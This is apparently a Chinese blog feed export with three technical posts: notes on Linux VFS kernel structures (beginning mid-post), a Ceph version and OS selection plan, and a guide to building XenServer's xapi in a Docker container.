<p>这里的建立于释放是从内存占用的角度看。从Linux角度看，dentry与inode是VFS中固有的东西。所不同的只是VFS是否把dentry与inode读到了内存中。对于Ext2&#x2F;3文件系统，构建dentry与inode的过程非常简单，但对于其他文件系统，则会慢得多。</p>
<h2 id="Process-File"><a href="#Process-File" class="headerlink" title="Process &amp; File"></a>Process &amp; File</h2><p><img src="/images/vfs/file_1.png" alt="file_1.png"></p>
<p>task_struct (<code>include/linux/sched.h</code>)</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> &#123;</span></span><br><span class="line">    ...</span><br><span class="line"><span class="comment">/* CPU-specific state of this task */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">thread_struct</span> <span class="title">thread</span>;</span></span><br><span class="line"><span class="comment">/* filesystem information */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">fs_struct</span> *<span class="title">fs</span>;</span></span><br><span class="line"><span class="comment">/* open file information */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">files_struct</span> *<span class="title">files</span>;</span></span><br><span class="line"><span class="comment">/* namespaces */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">nsproxy</span> *<span class="title">nsproxy</span>;</span></span><br><span class="line">    ...</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>进程控制块<code>task_struct</code>(<code>include/linux/sched.h</code>)中有两个变量与文件有关：<code>fs</code>(<code>struct fs_struct</code>)与<code>files</code>(<code>struct files_struct</code>)。</p>
<p>fs_struct (<code>include/linux/fs_struct.h</code>)</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fs_struct</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> users;</span><br><span class="line">    <span class="type">spinlock_t</span> lock;</span><br><span class="line">    <span class="type">seqcount_t</span> seq;</span><br><span class="line">    <span class="type">int</span> umask;</span><br><span class="line">    <span class="type">int</span> in_exec;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">path</span> <span class="title">root</span>, <span class="title">pwd</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>path (<code>include/liinux/path.h</code>)</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">path</span> &#123;</span></span><br><span class="line">     <span class="class"><span class="keyword">struct</span> <span class="title">vfsmount</span> *<span class="title">mnt</span>;</span></span><br><span class="line">     <span class="class"><span class="keyword">struct</span> <span class="title">dentry</span> *<span class="title">dentry</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><code>fs</code>中存储着<code>root</code>与<code>pwd</code>两个指向<code>dentry</code>项的指针。用户定路径时，绝对路径会通过<code>root</code>进行定位；相对路径会通过<code>pwd</code>进行定位。进程的<code>root</code>不一定是文件系统的根目录。如ftp进程的根目录不是文件系统的根目录，这样才能保证用户只能访问ftp目录下的内容。<br><code>files</code>是一个file object列表，其中每一个节点对应着一个被打开了的文件。</p>
<p>files_struct (<code>include/linux/fdtable.h</code>)</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">files_struct</span> &#123;</span></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">   * read mostly part</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">    <span class="type">atomic_t</span> count;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">fdtable</span> __<span class="title">rcu</span> *<span class="title">fdt</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">fdtable</span> <span class="title">fdtab</span>;</span></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">   * written part on a separate cache line in SMP</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">    <span class="type">spinlock_t</span> file_lock ____cacheline_aligned_in_smp;</span><br><span class="line">    <span class="type">int</span> next_fd;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> close_on_exec_init[<span class="number">1</span>];</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> open_fds_init[<span class="number">1</span>];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">file</span> __<span class="title">rcu</span> * <span class="title">fd_array</span>[<span class="title">NR_OPEN_DEFAULT</span>];</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>当进程定位到文件时，会构造一个file object，并通过<code>f_inode</code>关联到<code>inode</code>节点。文件关闭时（close），进程会释放对应对应file object。</p>
<p>fdtable (<code>include/linux/fdtable.h</code>)</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fdtable</span> &#123;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> max_fds;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">file</span> __<span class="title">rcu</span> **<span class="title">fd</span>;</span>      <span class="comment">/* current fd array */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> *close_on_exec;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> *open_fds;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> <span class="title">rcu</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><img src="/images/vfs/file_2.jpg" alt="file_2.jpg"></p>
<p>fd数组第一个元素[0]是进程的标准输入文件；第二个元素[1]是进程的标准输出文件；第三个元素[2]是进程的标准错误文件。</p>
<h1 id="文件系统类型"><a href="#文件系统类型" class="headerlink" title="文件系统类型"></a>文件系统类型</h1><h2 id="特殊文件系统"><a href="#特殊文件系统" class="headerlink" title="特殊文件系统"></a>特殊文件系统</h2><table>
<thead>
<tr>
<th align="left">文件系统</th>
<th align="left">安装点</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left">bdev</td>
<td align="left">无</td>
<td align="left">块设备</td>
</tr>
<tr>
<td align="left">binfmt_misc</td>
<td align="left">任意</td>
<td align="left">其他可执行格式</td>
</tr>
<tr>
<td align="left">devpts</td>
<td align="left">&#x2F;dev&#x2F;pts</td>
<td align="left">伪终端支持</td>
</tr>
<tr>
<td align="left">eventpollfs</td>
<td align="left">无</td>
<td align="left">由事件轮询机制使用</td>
</tr>
<tr>
<td align="left">futexfs</td>
<td align="left">无</td>
<td align="left">由futex（快速用户空间加锁）机制使用</td>
</tr>
<tr>
<td align="left">pipefs</td>
<td align="left">无</td>
<td align="left">管道</td>
</tr>
<tr>
<td align="left">proc</td>
<td align="left">&#x2F;proc</td>
<td align="left">对内核数据结构的常规访问点</td>
</tr>
<tr>
<td align="left">rootfs</td>
<td align="left">无</td>
<td align="left">为启动阶段提供一个空的根目录</td>
</tr>
<tr>
<td align="left">shm</td>
<td align="left">无</td>
<td align="left">IPC共享线性区</td>
</tr>
<tr>
<td align="left">mqueue</td>
<td align="left">任意</td>
<td align="left">实现POSIX消息队列时使用</td>
</tr>
<tr>
<td align="left">sockfs</td>
<td align="left">无</td>
<td align="left">套接字</td>
</tr>
<tr>
<td align="left">sysfs</td>
<td align="left">&#x2F;sys</td>
<td align="left">对系统数据的常规访问点</td>
</tr>
<tr>
<td align="left">tmpfs</td>
<td align="left">任意</td>
<td align="left">临时文件（若不被交换出去，则常驻内存中）</td>
</tr>
<tr>
<td align="left">usbfs</td>
<td align="left">&#x2F;proc&#x2F;bus&#x2F;usb</td>
<td align="left">USB设备</td>
</tr>
</tbody></table>
<p>内核给每个安装的特殊文件系统分配一个虚拟的块设备，让其主设备号为0，次设备号有任意值（每个特殊的文件系统有不同的值）</p>
<h2 id="文件系统类型注册"><a href="#文件系统类型注册" class="headerlink" title="文件系统类型注册"></a>文件系统类型注册</h2><p>文件系统的源码要么包含在内核映像中，要么作为一个模块被动态装入。每个注册的文件系统都用一个类型为<code>file_system_type</code>的对象来表示。<br>file_system_type (<code>include/linux/fs.h</code>)</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file_system_type</span> &#123;</span></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *name;       <span class="comment">/* 文件系统名称 */</span></span><br><span class="line">    <span class="type">int</span> fs_flags;           <span class="comment">/* 文件系统类型标志 */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FS_REQUIRES_DEV     1   <span class="comment">/* 文件系统必须位于物理磁盘设备上 */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FS_BINARY_MOUNTDATA 2   <span class="comment">/* 文件系统使用的二进制安装数据 */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FS_HAS_SUBTYPE      4</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FS_USERNS_MOUNT     8   <span class="comment">/* Can be mounted by userns root */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FS_USERNS_DEV_MOUNT 16 <span class="comment">/* A userns mount does not imply MNT_NODEV */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FS_RENAME_DOES_D_MOVE   32768   <span class="comment">/* FS will handle d_move() during rename() internally. */</span></span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">dentry</span> *(*<span class="title">mount</span>) (<span class="keyword">struct</span> <span class="title">file_system_type</span> *, <span class="title">int</span>, <span class="title">const</span> <span class="title">char</span> *, <span class="title">void</span> *);</span></span><br><span class="line">    <span class="type">void</span> (*kill_sb) (<span class="keyword">struct</span> super_block *);     <span class="comment">/* 删除超级块的方法 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">module</span> *<span class="title">owner</span>;</span>                       <span class="comment">/* 指向实现文件系统的模块指针 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">file_system_type</span> * <span class="title">next</span>;</span>             <span class="comment">/* 指向文件系统类型链表下一个元素的指针 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">hlist_head</span> <span class="title">fs_supers</span>;</span>                <span class="comment">/* 具有相同文件系统类型的超级块对象链表的头*/</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">lock_class_key</span> <span class="title">s_lock_key</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">lock_class_key</span> <span class="title">s_umount_key</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">lock_class_key</span> <span class="title">s_vfs_rename_key</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">lock_class_key</span> <span class="title">s_writers_key</span>[<span class="title">SB_FREEZE_LEVELS</span>];</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">lock_class_key</span> <span class="title">i_lock_key</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">lock_class_key</span> <span class="title">i_mutex_key</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">lock_class_key</span> <span class="title">i_mutex_dir_key</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>所有文件系统类型的对象都插入道一个单向链表中，由变量<code>file_systems</code>指向链表的第一个元素，<code>file_systems-&gt;next</code>指向链表的下一个元素。</p>
<p><code>int register_filesystem(struct file_system_type * fs)</code>[fs&#x2F;filesystems.c]<br>注册一个新的文件系统，传入要注册文件系统的结构体，在<code>file_systems</code>列表中查找受否与传入<code>fs-&gt;name</code>同名的文件系统，如果存在则返回找到的fs，若不存在将传入文件系统<code>fs</code>加入<code>file_systems</code>列表</p>
<p>对比一下<code>ramfs_fs_type</code>和<code>root_fs_type</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_system_type</span> <span class="title">ramfs_fs_type</span> =</span> &#123;</span><br><span class="line">    .name       = <span class="string">&quot;ramfs&quot;</span>,</span><br><span class="line">    .mount      = ramfs_mount,</span><br><span class="line">    .kill_sb    = ramfs_kill_sb,</span><br><span class="line">    .fs_flags   = FS_USERNS_MOUNT,</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_system_type</span> <span class="title">rootfs_fs_type</span> =</span> &#123;</span><br><span class="line">    .name       = <span class="string">&quot;rootfs&quot;</span>,</span><br><span class="line">    .mount      = rootfs_mount,</span><br><span class="line">    .kill_sb    = kill_litter_super,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>发现<code>fs_flags = FS_USERNS_MOUNT</code>，这个flag似乎想告诉我们，ramfs是挂载到用户命名空间的，言外之意rootfs不是挂载到用户空间的，那便是内核空间喽。</p>
<h2 id="文件系统处理"><a href="#文件系统处理" class="headerlink" title="文件系统处理"></a>文件系统处理</h2><ul>
<li>每个文件系统都有自己的根目录</li>
<li>已安装文件系统的根目录隐藏了父文件系统的安装点目录原来的内容</li>
</ul>
<h2 id="命名空间"><a href="#命名空间" class="headerlink" title="命名空间"></a>命名空间</h2><p>通常进程共享一个命名空间，位于系统的根文件系统且被init进程使用的已安装文件系统树。如果<code>clone()</code>系统调用以<code>CLONE_NEWNS</code>标志创建一个新进程，那么新进程将获取一个新的命名空间，新进程再创建的新新进程将继承新命名空间。</p>
<ul>
<li>fork<br>  fork创造的子进程是父进程的完整副本，复制了父亲进程的资源，包括内存的内容task_struct内容</li>
<li>vfork<br>  vfork创建的子进程与父进程共享数据段,而且由vfork()创建的子进程将先于父进程运行</li>
<li>clone<br>  有选择性的继承父进程的资源，可以选择像vfork一样和父进程共享一个虚存空间，可以不和父进程共享，甚至可以选择创造出来的进程和父进程不再是父子关系，而是兄弟关系。灵活性更强。</li>
</ul>
<h1 id="KeyPoint"><a href="#KeyPoint" class="headerlink" title="KeyPoint"></a>KeyPoint</h1><h2 id="启动流程"><a href="#启动流程" class="headerlink" title="启动流程"></a>启动流程</h2><ol>
<li>start_kernel[init&#x2F;main.c]</li>
<li>vfs_caches_init(totalram_pages)[fs&#x2F;dcache.c]</li>
<li>dcache_init()[fs&#x2F;dcache.c]<br> 初始化<code>dentry_cache</code>和<code>dentry_hashtable</code></li>
<li>inode_init()[fs&#x2F;inode.c]<br> 初始化<code>inode_cachep</code>和<code>inode_hashtable</code></li>
<li>files_init()[fs&#x2F;file_table.c]<br> 初始化<code>file_cachep</code>、<code>files_stat.max_files</code></li>
<li>mnt_init()[fs&#x2F;namespace.c]<br> 初始化<code>mnt_cache</code>,<code>mount_hashtable</code>,<code>mountpoint_hashtable</code><ol>
<li>sysfs_init()[fs&#x2F;sysfs&#x2F;mount.c]<br> 初始化<code>sysfs_dir_cachep</code><br> sysfs_inode_init()[s&#x2F;sysfs&#x2F;inode.c] -&gt; <code>bdi_init(&amp;sysfs_backing_dev_info)</code><br> <code>register_filesystem(&amp;sysfs_fs_type)</code><br> <code>sysfs_mnt = kern_mount(&amp;sysfs_fs_type)</code></li>
<li>init_root()[fs&#x2F;ramfs&#x2F;inode.c]<br> <code>bdi_init(&amp;ramfs_backing_dev_info)</code><br> <code>register_filesystem(&amp;rootfs_fs_type)</code></li>
<li>init_mount_tree()[fs&#x2F;namespace.c]<br> 挂载rootfs到<code>/</code> <code>mnt = vfs_kern_mount(type, 0, &quot;rootfs&quot;, NULL)</code><br> 创建namespace <code>ns = create_mnt_ns(mnt)</code><br> 设置<code>init_task</code>(PID&#x3D;0)命名空间 <code>init_task.nsproxy-&gt;mnt_ns = ns</code><br> 设置当前进程的<code>pwd</code>和<code>root</code> <code>set_fs_pwd(current-&gt;fs, &amp;root); set_fs_root(current-&gt;fs, &amp;root);</code></li>
</ol>
</li>
<li>bdev_cache_init()[fs&#x2F;block_dev.c]<br> 初始化<code>bdev_cachep</code><ol>
<li>mount bdev</li>
</ol>
</li>
<li>chrdev_init()[fs&#x2F;char_dev.c]<br> 初始化<code>cdev_map</code></li>
</ol>
<h2 id="Mount文件系统"><a href="#Mount文件系统" class="headerlink" title="Mount文件系统"></a>Mount文件系统</h2><p><img src="/images/vfs/mount_1.png" alt="mount_1.png"></p>
<p>mount时，linux先找到磁盘分区的super block，然后通过解析磁盘的inode table与file data，构建出自己的dentry列表与inode列表。需要注意的是，VFS实际上是按照Ext的方式进行构建的，所以两者非常相似（毕竟Ext是Linux的原生文件系统）。比如inode节点，Ext与VFS中都把文件管理结构称为inode，但实际上它们是不一样的。Ext的inode节点在磁盘上；VFS的inode节点在内存里。Ext-inode中的一些成员变量其实是没有用的，如引用计数等。保留它们的目的是为了与vfs-node保持一致。这样在用ext-inode节点构造vfs-inode节点时，就不需要一个一个赋值，只需一次内存拷贝即可。</p>
<h1 id="参考-鸣谢"><a href="#参考-鸣谢" class="headerlink" title="参考&amp;鸣谢"></a>参考&amp;鸣谢</h1><ul>
<li><a href="http://blog.csdn.net/gatieme/article/details/51484562">Linux下0号进程的前世(init_task进程)今生(idle进程)—-Linux进程的管理与调度（五）</a></li>
<li><a href="https://segmentfault.com/a/1190000009472553#articleHeader9">vfs基础</a></li>
<li><a href="http://blog.chinaunix.net/xmlrpc.php?r=blog/article&uid=28541347&id=4138031">Linux文件系统（三）——进程与VFS的关系</a></li>
<li><a href="http://blog.chinaunix.net/xmlrpc.php?r=blog/article&uid=28541347&id=4138028">linux文件系统（二）——VFS四个主要对象的实现</a></li>
<li><a href="http://blog.csdn.net/gatieme/article/details/51417488">Linux中fork，vfork和clone详解（区别与联系）</a></li>
</ul>
]]></content>
      <categories>
        <category>storage</category>
      </categories>
      <tags>
        <tag>vfs</tag>
      </tags>
  </entry>
  <entry>
    <title>ceph &amp; OS 版本选择</title>
    <url>/2016/04/12/works/ceph_stable_select/</url>
    <content><![CDATA[<h1 id="背景介绍"><a href="#背景介绍" class="headerlink" title="背景介绍"></a>背景介绍</h1><p>ceph 版本分类包括“开发版”、“稳定版（Stable）”、“长期支持版（LTS）”；</p>
<ul>
<li>开发版，增加修改功能而产生的版本</li>
<li>稳定版本，短期维护的版本，周期不固定</li>
<li>长期支持版本，长期维护的版本，周期为10个月左右(或更长)</li>
</ul>
<p>以下列出稳定版和长期支持版本及对应的版本号：</p>
<table>
<thead>
<tr>
<th>版本名称</th>
<th align="center">分类</th>
<th align="right">版本号</th>
</tr>
</thead>
<tbody><tr>
<td>argonaut</td>
<td align="center">Stable</td>
<td align="right">v0.48 ~ v0.48.3</td>
</tr>
<tr>
<td>bobtail</td>
<td align="center">Stable</td>
<td align="right">v0.56 ~ v0.56.7</td>
</tr>
<tr>
<td>Cuttlefish</td>
<td align="center">Stable</td>
<td align="right">v0.61 ~ v0.61.9</td>
</tr>
<tr>
<td>Dumpling</td>
<td align="center">LTS</td>
<td align="right">v0.67 ~ v0.67.12</td>
</tr>
<tr>
<td>Emperor</td>
<td align="center">Stable</td>
<td align="right">v0.72 ~ v0.72.3</td>
</tr>
<tr>
<td>Firefly</td>
<td align="center">LTS</td>
<td align="right">v0.80 ~ v0.80.11</td>
</tr>
<tr>
<td>Giant</td>
<td align="center">Stable</td>
<td align="right">v0.87 ~ v0.87.2</td>
</tr>
<tr>
<td>Hammer</td>
<td align="center">LTS</td>
<td align="right">v0.94 ~ v0.94.6</td>
</tr>
<tr>
<td>Infernalis</td>
<td align="center">Stable</td>
<td align="right">v9.2.0 ~ v9.2.1</td>
</tr>
<tr>
<td>Jewel</td>
<td align="center">Stable or LTS</td>
<td align="right">v10.2.0（未发布）</td>
</tr>
</tbody></table>
<h1 id="稳定性-功能完整性"><a href="#稳定性-功能完整性" class="headerlink" title="稳定性&amp;功能完整性"></a>稳定性&amp;功能完整性</h1><ul>
<li>ceph 的“Stable版”和“LTS版”稳定性相对可靠，但LTS版本由社区维护更新，稳定性更佳；</li>
<li>ceph 的功能在开发版中开发，然后合并到稳定版中维护修改bug，新版本涵盖旧版本功能；</li>
<li>ceph 只有一条产品路线，所以各个版本中发现的bug，最终都会合并到主线版本上，导致在Stable（或LTS）版本中发现的问题，会在下一个Stable（或LTS）版本中得到修复；</li>
</ul>
<p>综上所述，可供选择的版本有Hammer 、 Infernalis 和 Jewel</p>
<h1 id="性能最优"><a href="#性能最优" class="headerlink" title="性能最优"></a>性能最优</h1><ul>
<li>BlueStore 提供更优的后端存储性能<br>  Hammer及以前版本后端存储采用的是XFS文件系统，这样延长了数据落盘的路径；<br>  在Jewel版本中ceph增加了一种存储方式BlueStore，BlueStore可以直接在裸设备上进行读写操作，缩短落盘路径，性能更优；</li>
<li>纠删码（EC）性能优化<br>  ceph 对数据保护采用的是多副本（三副本）的方式，这种方式简单稳定性能好，但存储成本较贵，由此ceph推出了EC，但其EC性能较差，只能配合cache tier使用，才能发挥功效；<br>  为此在 Infernalis 及以后版本中对EC性能和稳定性进行了优化；</li>
</ul>
<h1 id="环境依赖"><a href="#环境依赖" class="headerlink" title="环境依赖"></a>环境依赖</h1><p>ceph的运行平台众多，包括：CentOS（RHEL）、Debian、Ubuntu、Fedora</p>
<p>CentOS（RHEL）</p>
<ul>
<li>Hammer 及以前版本对应平台 CentOS 6</li>
<li>Infernalis 及以后版本对应平台 CentOS 7 或更高版本</li>
</ul>
<h1 id="Stable-LTS时效性"><a href="#Stable-LTS时效性" class="headerlink" title="Stable &amp; LTS时效性"></a>Stable &amp; LTS时效性</h1><table>
<thead>
<tr>
<th></th>
<th align="center">Hammer</th>
<th align="right">Infernalis</th>
</tr>
</thead>
<tbody><tr>
<td>启始日期</td>
<td align="center">2015.04</td>
<td align="right">2015.11</td>
</tr>
<tr>
<td>终止日期</td>
<td align="center">2016.11</td>
<td align="right">2016.06</td>
</tr>
</tbody></table>
<h1 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h1><ol>
<li>ceph 建议采用 Infernalis 版本（若实施前Jewel Stable or LTS版本发出，可直接选择Jewel）</li>
<li>OS 建议采用 CentOS 7</li>
</ol>
<p>原因：</p>
<ul>
<li>从稳定性和功能完整性角度来说，目前可以选择Hammer或者Infernalis</li>
<li>从性能最优角度说，最理想的选择是Jewel</li>
<li>考虑到日后升级维护，Infernalis的下一个LTS版本（可能是Jewel）会是最好的选择</li>
<li>若选择Hammer，日后想升级到Jewel，需要先升级OS，然后再升级ceph版本，改动太大，风险不可控制</li>
<li>若选择Infernalis，日后升级，可直接升级ceph版本即可</li>
</ul>
]]></content>
      <categories>
        <category>works</category>
      </categories>
      <tags>
        <tag>ceph</tag>
        <tag>plan</tag>
      </tags>
  </entry>
  <entry>
    <title>构建XenServer编译环境</title>
    <url>/2018/01/31/works/create-xs-builder-env/</url>
    <content><![CDATA[<p>社区版<a href="https://github.com/xenserver">XenServer</a>是一款开源产品。那么拿到这款社区版首先想到的是怎么把它build出来，然后怎么把它部署起来，最后才是巴拉巴拉吧啦。。。</p>
<p>我们先来解决第一步，编译源码，编译之前需要先构建编译环境，构建好编译环境后以xapi为例进行编译。xapi是用<a href="http://ocaml.org/">OCaml</a>这种语言写的，本人对这种语言一窍不通。这儿就不讨论了 ……</p>
<h1 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h1><p>本人打算使用容器进行编译xapi，所以你得先有个docker环境，然后呢编译的是xapi代码也得自己下好吧。</p>
<p>具体操作，巴拉巴拉吧啦。</p>
<h1 id="构建编译环境"><a href="#构建编译环境" class="headerlink" title="构建编译环境"></a>构建编译环境</h1><h2 id="拉取xenserver-build-env"><a href="#拉取xenserver-build-env" class="headerlink" title="拉取xenserver-build-env"></a>拉取<code>xenserver-build-env</code></h2><p>使用<code>docker pull xenserver/xenserver-build-env</code>命令拉取镜像，这是个漫长的过程还有可能失败，镜像还挺大。</p>
<p>喝杯茶，慢慢等吧。。。</p>
<h2 id="启动编译容器"><a href="#启动编译容器" class="headerlink" title="启动编译容器"></a>启动编译容器</h2><p>走到这里，说明你的镜像拉取成功了，那么我们需要启动镜像，本人推荐使用下列方法启动镜像</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">docker run -i -t -v /home/&#123;xxxx&#125;/labs/xen-api:/mnt/repos --name xapi-builder xenserver/xenserver-build-env /usr/local/bin/init-container.sh</span></span><br></pre></td></tr></table></figure>
<p>别傻乎乎的copy直接用啊，里面的路径要根据实际情况自己调整，我懒了你不能懒。</p>
<p>网上坛子里有人推荐加参数<code>-u builder</code>，的确build的过程不推荐使用root用户；我用root是因为我要把它装到容器里，用builder会引入一些权限和环境问题。所以我用root了，您根据自己的情况而定。别盲从！！！</p>
<h2 id="配置编译环境"><a href="#配置编译环境" class="headerlink" title="配置编译环境"></a>配置编译环境</h2><p>你是否以为下载好了镜像，并且成功的启动的容器，就可以顺理成章的编译了？哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈，别做梦了。哪有那么简单，社区版不给你点儿坑你都觉得不过瘾。</p>
<h3 id="安装dep包"><a href="#安装dep包" class="headerlink" title="安装dep包"></a>安装dep包</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">yum-buiddep xapi</span></span><br></pre></td></tr></table></figure>
<p>我是root，不是root自己加<code>sudo</code>去。</p>
<h3 id="初始化opam"><a href="#初始化opam" class="headerlink" title="初始化opam"></a>初始化opam</h3><p>卧槽，opam什么东西，一脸的懵B啊！？不用太深究，就是一个类似pip的包管理器；想深究的可以自己研究<a href="https://opam.ocaml.org/">OPAM</a></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">opam init</span></span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><br><span class="line"></span><br><span class="line">1. To configure OPAM in the current shell session, you need to run:</span><br><span class="line"></span><br><span class="line">      eval `opam config env`</span><br><span class="line"></span><br><span class="line">2. To correctly configure OPAM for subsequent use, add the following</span><br><span class="line">   line to your profile file (for instance ~/.profile):</span><br><span class="line"></span><br><span class="line">      . /root/.opam/opam-init/init.sh &gt; /dev/null 2&gt; /dev/null || true</span><br><span class="line"></span><br><span class="line">3. To avoid issues related to non-system installations of `ocamlfind`</span><br><span class="line">   add the following lines to ~/.ocamlinit (create it if necessary):</span><br><span class="line"></span><br><span class="line">      let () =</span><br><span class="line">        try Topdirs.dir_directory (Sys.getenv &quot;OCAML_TOPLEVEL_PATH&quot;)</span><br><span class="line">        with Not_found -&gt; ()</span><br><span class="line">      ;;</span><br><span class="line"></span><br><span class="line">=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><br><span class="line">...</span><br><span class="line"><span class="meta prompt_"># </span></span><br></pre></td></tr></table></figure>

<p>看到这段英文了吧，1、2、3，乖乖的照做，要不管保你编不过。</p>
<p>最后切记，将<code>eval \</code>opam config env`<code>加到</code><del>&#x2F;.bashrc<code>或</code></del>&#x2F;.profile&#96;中。</p>
<h3 id="使用opam安装包ocamlfind-cmdliner-jbuilder"><a href="#使用opam安装包ocamlfind-cmdliner-jbuilder" class="headerlink" title="使用opam安装包ocamlfind, cmdliner, jbuilder"></a>使用opam安装包ocamlfind, cmdliner, jbuilder</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">opam depext conf-m4.1</span></span><br><span class="line">...</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">opam install ocamlfind cmdliner jbuilder</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>安装过程中有需要点确认的授权的，改给就给，千万别搞事情！</p>
<p>到此为止环境的搭建算是完成了，记住这个session不要退，再开一个session去做编译一会儿有惊喜。。。</p>
<h1 id="编译xapi"><a href="#编译xapi" class="headerlink" title="编译xapi"></a>编译xapi</h1><p>使用<code>docker exec -it xapi-builder /bin/bash</code>登录进你的容器，像上文说到的你可以使用<code>-u builder</code>参数。</p>
<p>废话不多说直接编译</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cd</span> /mnt/repo/</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">./configure</span></span><br><span class="line">...</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">make</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>别急，会报错的，看到了吧。stack overflow，去网上搜吧，一搜返回一堆stack overflow的网站，哈哈哈！！！</p>
<p>别急，还记得之前保留的那个session吗，对，就是那个session。输入<code>ulimit -a</code>看看里面的<code>stack size</code>；再对比看看报错的那个session的<code>stack size</code>。是不是有一种恍然大悟的感觉。没错设置一下报错session的<code>stack size</code>就可以了<code>ulimit -s 16384</code>。</p>
<hr>
<p>你刚刚经历了一个华丽的分割线。。。</p>
<hr>
<p>如果你使用<a href="https://github.com/xcp-ng/xenserver-build-env"><code>xenserver-build-env</code></a>创建编译环境，可以省去很多步骤。</p>
